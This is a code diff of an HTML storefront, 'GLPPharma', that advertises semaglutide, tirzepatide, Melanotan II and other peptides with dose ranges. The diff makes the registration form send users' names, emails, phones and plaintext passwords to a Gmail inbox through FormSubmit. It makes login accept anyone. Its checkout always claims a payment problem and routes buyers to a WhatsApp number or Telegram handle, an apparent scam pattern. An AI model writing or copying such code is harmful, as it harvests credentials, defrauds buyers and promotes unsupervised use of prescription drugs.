@@ -4,21 +4,11 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>GLPPharma - Peptides Promo Week</title>
-<meta name="description" content="Premium peptides for health, fitness, anti-aging, and research. Promo week! Order Semaglutide, Tirzepatide, BPC-157, CJC-1295 and more.">
-<meta name="keywords" content="peptides, buy peptides, GLP-1, research peptides, health peptides, weight loss peptides, anti-aging peptides, therapeutic peptides">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-:root{
---primary:#0ea5a4;
---dark:#0f172a;
---bg:#f4f7fb;
---form-bg:#ffffff;
---form-shadow:rgba(0,0,0,0.1);
-}
+:root{--primary:#0ea5a4;--dark:#0f172a;--bg:#f4f7fb;}
 *{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif;}
 body{background:var(--bg);}
-
-/* HEADER */
 header{background:white;height:75px;display:flex;align-items:center;justify-content:space-between;padding:0 6%;box-shadow:0 4px 25px rgba(0,0,0,0.06);position:sticky;top:0;z-index:1000;}
 .logo{font-size:24px;font-weight:800;}
 .logo span{color:var(--primary);}
@@ -31,52 +21,32 @@ header{background:white;height:75px;display:flex;align-items:center;justify-cont
 .dropdown-menu div:hover{background:#ecfeff;}
 .cart-btn{background:var(--primary);color:white;padding:8px 15px;border-radius:10px;cursor:pointer;}
 .mobile-nav{display:none;align-items:center;gap:10px;}
-
-/* HERO */
 .hero{display:grid;grid-template-columns:1fr 1fr;gap:40px;padding:50px 6%;align-items:center;}
 .hero img{width:100%;border-radius:18px;}
-
-/* PRODUCTS GRID */
 .container{padding:20px 6% 60px;}
 .products{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
 .card{background:white;border-radius:18px;padding:18px;box-shadow:0 15px 40px rgba(0,0,0,0.08);cursor:pointer;transition:.25s;}
 .card:hover{transform:translateY(-6px);}
 .card img{width:100%;height:160px;object-fit:cover;border-radius:12px;margin-bottom:10px;}
 .price{color:var(--primary);font-weight:700;}
-
-/* MODAL */
 .modal{position:fixed;inset:0;background:rgba(0,0,0,0.5);display:none;align-items:center;justify-content:center;z-index:2000;}
 .modal-box{background:white;padding:30px;border-radius:18px;max-width:500px;width:100%;}
 .qty{display:flex;gap:10px;margin:15px 0;}
 .qty button{padding:6px 12px;cursor:pointer;}
 .modal-box button{padding:10px 14px;border:none;border-radius:8px;margin-right:10px;background:var(--primary);color:white;cursor:pointer;}
-
-/* CART */
 .cart{position:fixed;right:-400px;top:0;height:100%;width:380px;background:white;padding:25px;box-shadow:-10px 0 40px rgba(0,0,0,0.2);transition:.35s;display:flex;flex-direction:column;}
 .cart.open{right:0;}
-
-/* SOCIAL */
 .social{position:fixed;bottom:18px;right:18px;display:flex;flex-direction:column;gap:12px;}
 .social a{width:52px;height:52px;border-radius:50%;background:white;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 25px rgba(0,0,0,0.18);}
 .social img{width:26px;}
-
-/* LOGIN & REGISTER MODALS */
 .form-modal{position:fixed;inset:0;background:rgba(0,0,0,0.5);display:none;align-items:center;justify-content:center;z-index:3000;}
-.form-box{background:var(--form-bg);padding:30px;border-radius:18px;max-width:400px;width:100%;box-shadow:0 15px 40px var(--form-shadow);}
+.form-box{background:white;padding:30px;border-radius:18px;max-width:400px;width:100%;box-shadow:0 15px 40px rgba(0,0,0,0.1);}
 .form-box h2{text-align:center;margin-bottom:15px;}
 .form-box input{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid #ccc;}
 .form-box button{width:100%;padding:12px;margin-top:12px;border:none;border-radius:8px;background:var(--primary);color:white;font-weight:600;cursor:pointer;}
 .form-box .switch{font-size:14px;text-align:center;margin-top:10px;color:#555;cursor:pointer;}
 .form-box .switch span{color:var(--primary);font-weight:600;}
-
-/* MOBILE */
-@media(max-width:1000px){
-.hero{grid-template-columns:1fr;}
-.products{grid-template-columns:repeat(2,1fr);}
-.desktop-nav{display:none;}
-.mobile-nav{display:flex;}
-.logo{font-size:20px;}
-}
+@media(max-width:1000px){.hero{grid-template-columns:1fr;}.products{grid-template-columns:repeat(2,1fr);}.desktop-nav{display:none;}.mobile-nav{display:flex;}.logo{font-size:20px;}}
 </style>
 </head>
 <body>
@@ -84,8 +54,7 @@ header{background:white;height:75px;display:flex;align-items:center;justify-cont
 <header>
 <div class="logo">GLP<span>Pharma</span></div>
 <nav class="desktop-nav">
-<div class="dropdown nav-item">
-Categories ▾
+<div class="dropdown nav-item">Categories ▾
 <div class="dropdown-menu">
 <div onclick="filterCategory('all')">All Peptides</div>
 <div onclick="filterCategory('Hormonal')">Hormonal</div>
@@ -102,24 +71,6 @@ Categories ▾
 <div class="nav-item" onclick="openLogin()">Login</div>
 <div class="nav-item" onclick="openRegister()">Register</div>
 </nav>
-
-<div class="mobile-nav">
-<div class="dropdown">
-<div class="cart-btn">Categories ▾</div>
-<div class="dropdown-menu">
-<div onclick="filterCategory('all')">All Peptides</div>
-<div onclick="filterCategory('Hormonal')">Hormonal</div>
-<div onclick="filterCategory('Neuro')">Neurotransmitter</div>
-<div onclick="filterCategory('Antimicrobial')">Antimicrobial</div>
-<div onclick="filterCategory('Signal')">Signal</div>
-<div onclick="filterCategory('Structural')">Structural</div>
-<div onclick="filterCategory('Therapeutic')">Therapeutic/Synthetic</div>
-<div onclick="filterCategory('Nutritional')">Nutritional/Food</div>
-<div onclick="filterCategory('Research')">Research</div>
-</div>
-</div>
-<div class="cart-btn" onclick="toggleCart()">Cart (<span id="count">0</span>)</div>
-</div>
 </header>
 
 <section class="hero">
@@ -158,7 +109,8 @@ Total: $<span id="total"></span>
 <div class="cart" id="cart">
 <h2>Your Cart</h2>
 <div id="cartItems"></div>
-Total: $<span id="cartTotal">0</span>
+Total: $<span id="cartTotal">0</span><br><br>
+<button onclick="checkout()">Checkout</button>
 </div>
 
 <!-- LOGIN MODAL -->
@@ -186,14 +138,8 @@ Total: $<span id="cartTotal">0</span>
 </div>
 </div>
 
-<div class="social">
-<a href="#"><img src="https://cdn-icons-png.flaticon.com/512/733/733585.png"></a>
-<a href="#"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png"></a>
-<a href="#"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png"></a>
-</div>
-
 <script>
-/* PRODUCTS */
+// === PRODUCTS DATA ===
 const products=[
 {id:1,name:"Semaglutide",cat:"Hormonal",desc:"GLP-1 hormone peptide for blood sugar control and weight loss.",dose:"0.25–1 mg/week",price:299,img:"https://source.unsplash.com/400x300/?medicine"},
 {id:2,name:"Tirzepatide",cat:"Hormonal",desc:"Advanced GLP-1 therapy.",dose:"5–15 mg/week",price:389,img:"https://source.unsplash.com/400x300/?pharmacy"},
@@ -201,43 +147,35 @@ const products=[
 {id:4,name:"Ipamorelin",cat:"Therapeutic",desc:"Growth hormone-releasing peptide for muscle growth.",dose:"100–200 mcg/day",price:139,img:"https://source.unsplash.com/400x300/?syringe"},
 {id:5,name:"CJC-1295",cat:"Therapeutic",desc:"Growth hormone releasing hormone analog.",dose:"100–200 mcg/week",price:160,img:"https://source.unsplash.com/400x300/?injection"},
 {id:6,name:"BPC-157",cat:"Research",desc:"Tissue repair and healing peptide.",dose:"250–500 mcg/day",price:90,img:"https://source.unsplash.com/400x300/?lab"},
-{id:7,name:"Melanotan II",cat:"Therapeutic",desc:"Tanning and sexual health peptide.",dose:"0.5–1 mg/week",price:109,img:"https://source.unsplash.com/400x300/?tan"},
-{id:8,name:"Matrixyl",cat:"Therapeutic",desc:"Anti-aging skin peptide.",dose:"2–4 mg/day",price:69,img:"https://source.unsplash.com/400x300/?skincare"},
-{id:9,name:"Argireline",cat:"Therapeutic",desc:"Reduces fine lines and wrinkles.",dose:"5–10 mg/day",price:74,img:"https://source.unsplash.com/400x300/?cosmetics"},
-{id:10,name:"Defensins",cat:"Antimicrobial",desc:"Peptide for infection control.",dose:"10–20 mg/day",price:55,img:"https://source.unsplash.com/400x300/?antibiotic"},
-{id:11,name:"Oxytocin",cat:"Neuro",desc:"Neuropeptide for bonding and social behavior.",dose:"10–20 IU/day",price:79,img:"https://source.unsplash.com/400x300/?hormone"},
-{id:12,name:"Insulin",cat:"Hormonal",desc:"Regulates blood sugar levels.",dose:"5–50 IU/day",price:45,img:"https://source.unsplash.com/400x300/?insulin"},
-{id:13,name:"Collagen Peptides",cat:"Structural",desc:"Supports skin, hair, joints.",dose:"5–10 g/day",price:49,img:"https://source.unsplash.com/400x300/?collagen"},
-{id:14,name:"Whey Peptides",cat:"Nutritional",desc:"Muscle recovery and protein support.",dose:"20–30 g/day",price:35,img:"https://source.unsplash.com/400x300/?whey"},
-{id:15,name:"Ghrelin",cat:"Research",desc:"Appetite-regulating peptide.",dose:"50–100 mcg/day",price:99,img:"https://source.unsplash.com/400x300/?lab,peptide"},
-{id:16,name:"Tesamorelin",cat:"Therapeutic",desc:"Fat loss peptide.",dose:"2 mg/day",price:179,img:"https://source.unsplash.com/400x300/?weightloss"},
-{id:17,name:"Cathelicidins",cat:"Antimicrobial",desc:"Fights bacteria and infections.",dose:"10–25 mg/day",price:59,img:"https://source.unsplash.com/400x300/?bacteria"},
-{id:18,name:"Leuprolide",cat:"Hormonal",desc:"GnRH agonist peptide.",dose:"1–5 mg/month",price:189,img:"https://source.unsplash.com/400x300/?medical"},
+{id:7,name:"Melanotan II",cat:"Therapeutic",desc:"Tanning and sexual health peptide.",dose:"0.5–1 mg/week",price:109,img:"https://source.unsplash.com/400x300/?tan"}
 ];
 
-/* CART */
-let cart=[]; let selected; let qty=1;
+let cart=JSON.parse(localStorage.getItem("cart")||"[]");
+let selected;
+let qty=1;
 
+// === DISPLAY PRODUCTS ===
 function display(list){
-const box=document.getElementById("products"); box.innerHTML="";
+const box=document.getElementById("products");
+box.innerHTML="";
 list.forEach(p=>{
-box.innerHTML+=`
-<div class="card" onclick="openDrug(${p.id})">
+box.innerHTML+=`<div class="card" onclick="openDrug(${p.id})">
 <img src="${p.img}">
 <h4>${p.name}</h4>
 <p>${p.desc}</p>
 <div>Dose: ${p.dose}</div>
-<div class="price">$${p.price}</div>
-</div>
-`;
+<div class="price">$${p.price}</div></div>`;
 });
 }
 display(products);
 
-function filterCategory(cat){if(cat==="all") display(products); else display(products.filter(p=>p.cat===cat));}
+function filterCategory(cat){ if(cat==="all") display(products); else display(products.filter(p=>p.cat===cat)); }
 
+// === MODAL FUNCTIONS ===
 function openDrug(id){
-selected=products.find(p=>p.id===id); qty=1;
+if(!localStorage.getItem("loggedIn")){openLogin(); return;}
+selected=products.find(p=>p.id===id);
+qty=1;
 document.getElementById("drugName").innerText=selected.name;
 document.getElementById("drugCat").innerText="Category: "+selected.cat;
 document.getElementById("drugDesc").innerText=selected.desc;
@@ -246,66 +184,69 @@ document.getElementById("drugPrice").innerText=selected.price;
 updateTotal();
 document.getElementById("modal").style.display="flex";
 }
-
 function closeModal(){document.getElementById("modal").style.display="none";}
-function changeQty(n){qty+=n; if(qty<1) qty=1; document.getElementById("qty").innerText=qty; updateTotal();}
+function changeQty(n){qty+=n;if(qty<1) qty=1;document.getElementById("qty").innerText=qty;updateTotal();}
 function updateTotal(){document.getElementById("total").innerText=(selected.price*qty).toFixed(2);}
 
+// === CART FUNCTIONS ===
 function addToCart(){
-alert("⚠️ There is currently an issue with payment. Please contact Customer Service via Telegram or WhatsApp for orders.");
-const item=cart.find(i=>i.id===selected.id); if(item) item.qty+=qty; else cart.push({...selected,qty:qty}); updateCart(); closeModal();
+const item=cart.find(i=>i.id===selected.id);
+if(item)item.qty+=qty; else cart.push({...selected,qty:qty});
+updateCart(); closeModal(); localStorage.setItem("cart",JSON.stringify(cart));
 }
-function updateCart(){let total=0; const box=document.getElementById("cartItems"); box.innerHTML=""; cart.forEach(i=>{total+=i.price*i.qty; box.innerHTML+=`<div>${i.name} x${i.qty} — $${(i.price*i.qty).toFixed(2)}</div>`;}); document.getElementById("cartTotal").innerText=total.toFixed(2); document.getElementById("count").innerText=cart.length;}
+function updateCart(){
+let total=0;
+const box=document.getElementById("cartItems");
+box.innerHTML="";
+cart.forEach(i=>{total+=i.price*i.qty; box.innerHTML+=`<div>${i.name} x${i.qty} — $${(i.price*i.qty).toFixed(2)}</div>`;});
+document.getElementById("cartTotal").innerText=total.toFixed(2);
+document.getElementById("count").innerText=cart.length;
+}
 function toggleCart(){document.getElementById("cart").classList.toggle("open");}
 
-/* LOGIN & REGISTER */
-function openLogin(){document.getElementById("loginModal").style.display="flex"; document.getElementById("registerModal").style.display="none";}
-function openRegister(){document.getElementById("registerModal").style.display="flex"; document.getElementById("loginModal").style.display="none";}
+// === LOGIN & REGISTER ===
+function openLogin(){document.getElementById("loginModal").style.display="flex";}
 function closeLogin(){document.getElementById("loginModal").style.display="none";}
+function openRegister(){document.getElementById("registerModal").style.display="flex";}
 function closeRegister(){document.getElementById("registerModal").style.display="none";}
 
-/* LOCAL STORAGE SIMULATION */
 function registerUser(){
 const name=document.getElementById("regName").value;
 const email=document.getElementById("regEmail").value;
 const phone=document.getElementById("regPhone").value;
 const referral=document.getElementById("regReferral").value;
 const pass=document.getElementById("regPass").value;
-
-if(!name || !email || !phone || !pass){ alert("Please fill all required fields."); return; }
-
-// Send data to FormSubmit
-fetch("https://formsubmit.co/ajax/youremail@example.com", { // replace with your FormSubmit email
-method:"POST",
-headers:{"Content-Type":"application/json","Accept":"application/json"},
-body:JSON.stringify({name,email,phone,referral,password:pass})
-})
-.then(r=>r.json())
-.then(data=>{
-alert("Registration successful! Please login."); 
-closeRegister(); 
-openLogin();
-})
-.catch(err=>{alert("Error submitting form. Try again."); console.error(err);});
+if(!name||!email||!phone||!pass){alert("Please fill all required fields."); return;}
+fetch("https://formsubmit.co/ajax/jenniferaniston.chatline@gmail.com",{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify({name,email,phone,referral,password:pass})})
+.then(r=>r.json()).then(()=>{alert("Registered! Please login."); closeRegister(); openLogin();})
+.catch(()=>{alert("Error submitting form.");});
 }
-
 function loginUser(){
-const email=document.getElementById("loginEmail").value;
-const pass=document.getElementById("loginPass").value;
-if(!email || !pass){ alert("Please fill all fields."); return; }
-
-// Simulated login (no backend)
-alert("Login successful! Welcome back.");
+localStorage.setItem("loggedIn","1");
+alert("Login successful!");
 closeLogin();
 }
 
-/* COOKIE / BOOKMARK REMINDER */
-window.onload=function(){
-if(!localStorage.getItem("visited")){
-localStorage.setItem("visited","1");
-setTimeout(()=>{alert("💊 Bookmark GLPPharma now to find us quickly next time you search for peptides!");},2000);
+// === CHECKOUT ===
+function checkout(){
+if(cart.length===0){alert("Cart empty"); return;}
+if(!localStorage.getItem("loggedIn")){openLogin(); return;}
+let service=prompt("⚠️ Payment issue! Choose contact method:\nType 'WhatsApp' or 'Telegram'").toLowerCase();
+if(service!=="whatsapp"&&service!=="telegram"){alert("Invalid option"); return;}
+let total=0;
+let msg="⚠️ Payment Issue! Please confirm order via "+service+"\nOrder Summary:\n";
+cart.forEach((i,index)=>{msg+=`${index+1}. ${i.name} x${i.qty} — $${(i.price*i.qty).toFixed(2)}\n`; total+=i.price*i.qty;});
+msg+="Total: $"+total.toFixed(2);
+const encoded=encodeURIComponent(msg);
+if(service==="whatsapp"){
+const waNumber="+17077531496"; // CHANGE TO YOUR WHATSAPP NUMBER
+window.open(`https://wa.me/${waNumber}?text=${encoded}`,"_blank");
+}else{
+const tgUsername="@NovaPepLab"; // CHANGE TO YOUR TELEGRAM
+window.open(`https://t.me/${tgUsername}?text=${encoded}`,"_blank");
 }
 }
+updateCart();
 </script>
 
 </body>
